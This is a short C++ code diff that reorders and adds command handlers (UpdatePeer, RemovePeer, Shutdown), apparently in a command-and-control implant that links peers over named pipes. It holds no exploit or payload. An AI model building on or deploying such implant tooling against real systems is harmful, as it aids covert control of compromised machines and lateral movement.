@@ -214,7 +214,23 @@ namespace Commands {
         }
     }
 
-    VOID Shutdown (_parser *const parser) {
+    VOID UpdatePeer(_parser *parser) {
+        HEXANE
+
+        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
+        auto peer_id    = Parser::UnpackDword(parser);
+
+        Clients::AddClient(pipe_name, peer_id);
+    }
+
+    VOID RemovePeer(_parser *parser){
+        HEXANE
+
+        auto peer_id = Parser::UnpackDword(parser);
+        Clients::RemoveClient(peer_id);
+    }
+
+    VOID Shutdown (_parser *parser) {
         HEXANE
 
         // Send final message
@@ -223,13 +239,4 @@ namespace Commands {
         ntstatus = ERROR_EXIT;
     }
 
-    VOID UpdatePeer(_parser *const parser) {
-        HEXANE
-
-        auto pipe_name  = Parser::UnpackWString(parser, nullptr);
-        auto peer_id    = Parser::UnpackDword(parser);
-
-        Clients::AddClient(pipe_name, peer_id);
-
-    }
 }
